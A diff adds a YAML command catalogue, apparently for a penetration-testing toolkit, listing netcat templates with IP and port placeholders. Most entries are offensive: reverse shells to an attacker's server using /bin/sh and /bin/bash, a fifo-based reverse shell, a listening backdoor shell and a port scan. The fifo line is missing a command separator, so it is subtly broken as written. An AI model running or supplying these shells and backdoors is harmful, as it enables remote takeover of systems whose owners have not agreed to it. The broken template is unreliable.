@@ -1,0 +1,57 @@
+---
+name: netcat
+description: Arbitrary TCP and UDP connections and listeners
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Reverse Shell (/bin/sh)":
+    - type: ["other","NX"]
+    - text: "nc {IPV4} {INT} -e /bin/sh"
+    - input: ["attacker server IPv4 address","listening attacker TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Reverse Shell, -e Disabled (/bin/sh)":
+    - type: ["other","NX"]
+    - text: "rm /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc {IPV4} {INT} > /tmp/f"
+    - input: ["attacker server IPv4 address","listening attacker TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Connect to Target IP on Specified TCP Port":
+    - type: ["bash","standalone"]
+    - text: "nc {IPV4} {INT}"
+    - input: ["target IPv4 address","TCP port number"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Start TCP Listener":
+    - type: ["bash","standalone"]
+    - text: "nc -l -p {INT}"
+    - input: ["listening TCP port number"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "TCP Port Scan":
+    - type: ["bash","standalone"]
+    - text: "nc -v -n -z -w1 {IPV4} {INTRANGE}"
+    - input: ["target IPv4 address","TCP port number range"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Backdoor Linux Shell (bash)":
+    - type: ["bash","standalone"]
+    - text: "nc -l -p {INT} -e /bin/bash"
+    - input: ["listening TCP port number"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Linux Reverse Shell (bash)":
+    - type: ["bash","standalone"]
+    - text: "nc {IPV4} {INT} -e /bin/bash"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
